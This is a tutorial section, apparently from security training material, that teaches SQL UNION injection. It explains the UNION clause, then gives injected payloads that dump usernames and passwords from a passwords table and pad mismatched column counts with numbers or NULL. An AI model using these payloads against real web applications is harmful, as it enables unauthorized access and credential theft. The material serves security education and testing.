# Union Clause

So far, we have only been manipulating the original query to subvert the web application logic and bypass authentication, using the OR operator and comments. However, another type of SQL injection is injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL Union clause to do SQL Union Injection.

## Union Basics

Before learning about Union Injection, we should first understand the SQL Union clause. The Union clause is used to combine results from multiple SELECT statements. Through a UNION injection, we can SELECT and dump data from all across the DBMS, from multiple tables and databases.

### Example: Combining Tables

First, let's see the content of the ports table:

```sql
SELECT * FROM ports;
```

| code   | city      |
|--------|-----------|
| CN SHA | Shanghai  |
| SG SIN | Singapore |
| ZZ-21  | Shenzhen  |

Next, the ships table:

```sql
SELECT * FROM ships;
```

| Ship    | city     |
|---------|----------|
| Morrison| New York |

Now, combining both with UNION:

```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```

| code    | city      |
|---------|-----------|
| CN SHA  | Shanghai  |
| SG SIN  | Singapore |
| Morrison| New York  |
| ZZ-21   | Shenzhen  |

UNION combines the output of both SELECT statements into one result set.

> **Note:** Data types of selected columns in all positions must be the same.

## Even Columns

A UNION statement requires SELECT statements with an equal number of columns. For example:

```sql
SELECT city FROM ports UNION SELECT * FROM ships;
```

This returns an error because the first SELECT returns one column while the second returns two.

### Valid UNION Example

If the original query is:

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

We can inject:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

This returns username and password entries from the passwords table, assuming products has two columns.

## Uneven Columns

Often, the original query won't have the same number of columns as our injected query. We can use junk data (numbers, strings, or NULL) to match column counts.

### Examples

For a single-column extraction from a two-column table:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

For a four-column table:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2, 3, 4 from passwords-- '
```

Result:

| product_1 | product_2 | product_3 | product_4 |
|-----------|-----------|-----------|-----------|
| admin     | 2         | 3         | 4         |

The wanted output appears in the first column, with numbers filling remaining columns.

> **Tip:** Use `NULL` for advanced SQL injection, as it fits all data types.
